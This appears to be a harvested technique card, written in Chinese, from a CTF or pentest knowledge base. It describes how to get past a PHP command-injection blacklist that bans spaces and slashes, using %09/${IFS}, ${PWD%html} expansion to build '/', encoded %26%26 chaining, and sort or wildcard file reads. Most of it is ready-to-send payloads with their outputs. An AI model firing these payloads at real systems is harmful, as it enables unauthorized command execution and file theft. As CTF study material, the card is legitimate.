---
id: cmd-injection-slash-bypass-param-expansion
name: 命令注入：斜杠被 ban 时用 ${PWD%xxx} 参数展开造 /，并区分 bash 子串与 dash
description: 黑名单同时 ban 空格与 / 时，用 ${PWD%html} 让斜杠只出现在展开值里；${VAR:0:1} 在 dash 下失效，需先判 shell。
tags: [web, harvested]
source: harvested
imported_at: 2026-11-27
---

# 命令注入：斜杠被 ban 时用 ${PWD%xxx} 参数展开造 /，并区分 bash 子串与 dash

## 触发信号
- PHP `system($_GET['cmd'])` 前有 `preg_match` 黑名单，且**同时** ban 了空格和 `/`（常见正则片段：`| |\/|`）。
- 于是 `ls /`、`cat /flag` 一律回显拦截文案（如 `Don't Hack Me`），但 `ls`、`pwd`、`id` 正常 → 注入点可用，只是路径写不出来。
- `error_reporting(0)` 时没有报错 oracle，只有「命中/未命中」二值回显，必须靠 `pwd`/`ls` 的**输出内容**判断 payload 是否真的执行。

## 步骤
1. **先确认空格替代**：`?cmd=ls%09-l` 或 `?cmd=ls${IFS}-l`。若返回 `total 4 ... index.php` 说明 TAB / `${IFS}` 可用（正则只 ban 了字面空格，没 ban `\t`）。
2. **确认工作目录**：`?cmd=pwd` → 例如 `/var/www/html`。斜杠绕过方案依赖这个值，必须先拿到。
3. **判 shell 类型（关键分叉）**：
   - 试 `?cmd=ls${IFS}${PWD:0:1}`（bash 子串展开，取首字符 `/`）。
   - **返回空 body = dash/sh 不支持 `${VAR:0:1}`**，此路不通，别反复试变体（`${PATH:0:1}`、`${HOME:0:1}` 同样失效）。
4. **改用「后缀删除」展开造斜杠**：`${PWD%html}` 把 `$PWD` 末尾的 `html` 删掉，得到 `/var/www/` —— 斜杠存在于**展开结果**里，输入串中一个 `/` 都没有，`preg_match` 直接放行。POSIX 的 `%`/`#` 展开 dash 也支持。
   - 验证：`?cmd=ls${IFS}${PWD%html}..` → 列出 `/var`（`backups cache lib ... www`）。
5. **拼出绝对路径 / 逐级 cd**：
   - 直接拼：`${PWD%html}..${PWD%html}..` = `/var/www/../../`（注意 `..` 后必须再补一个 `${PWD%html}` 才能接下一段，否则 `....` 粘连）。
   - 更稳的是 `cd` 链：`cd%09${PWD%html}..%26%26cd%09..%26%26ls` → 先到 `/var` 再到 `/`，然后所有后续命令都用**相对路径**，彻底不需要斜杠。
6. **命令分隔符**：`;`、`|`、`` ` `` 常被 ban，`&&` 可用但**在 URL 查询串里必须写成 `%26%26`**——原始 `&` 会被 PHP 当成参数分隔符，`?cmd=id&&ls` 实际只执行了 `id`（这是极易误判为「&& 被过滤」的假象）。
7. **读文件**：`cat/tac/head/tail/more/less/nl/vi` 常被 ban，用 `sort`、`rev`、`od`、`awk`、`grep`、`dd` 替代；文件名含被 ban 子串（如 `fl`）时用 `?` 单字符通配（`*` 常被 ban，`?` 一般不在黑名单）：`sort%09?????????????????`。

## 证据
- `?cmd=ls${IFS}${PWD%html}..` → `backups cache lib local lock log mail opt run spool tmp www`（`/var` 内容），证明 `${PWD%html}` 展开为 `/var/www/`。
- `?cmd=ls${IFS}${PWD:0:1}` → **content-length: 0**，证明 dash 不支持子串展开。
- `?cmd=cd%09${PWD%html}..%26%26cd%09..%26%26ls` → 根目录列表（`bin boot dev etc ... start.sh`），证明 `%09` 当空格、`%26%26` 当 `&&` 均生效。
- `?cmd=cd%09${PWD%html}..%26%26cd%09..%26%26sort%09?????????????????` → 读到根目录下 17 字符文件名（含被 ban 的 `fl` 子串）的内容。

## 坑
- **`${VAR:0:1}` 是 bash 专属**：PHP `system()` 走 `/bin/sh`，Debian 上即 dash，子串展开静默失败（空输出，不报错）。看到空 body 就立刻换 `%`/`#` 展开，别在 `:0:1` 上耗时间。
- **`&` 必须 URL 编码成 `%26`**：查询串里裸 `&` 是参数分隔符，`&&` 会被拆成两个参数，表现为「命令链没生效」，很容易误判成 `&&` 被过滤而放弃。
- **`..` 拼接要补分隔**：`${PWD%html}..${PWD%html}..` 正确；写成 `${PWD%html}....` 会变成 `....` 一个非法目录名。
- **`$PWD` 与 `$HOME` 可能相同**（容器里 HOME 常被设成 web 根），别用 `$HOME` 当「另一个斜杠来源」来交叉验证，会得到误导性结果。
- 通配符长度要数准：`?` 的个数必须等于文件名长度，多一个少一个都匹配不到（`ls` 无输出 ≠ 文件不存在）。
- 若 `cd` 链在 `system()` 里看似无效，先单独发 `cd%09..%26%26pwd` 验证 `cd` 是否真的改变了子 shell 的 cwd，再叠加后续命令。
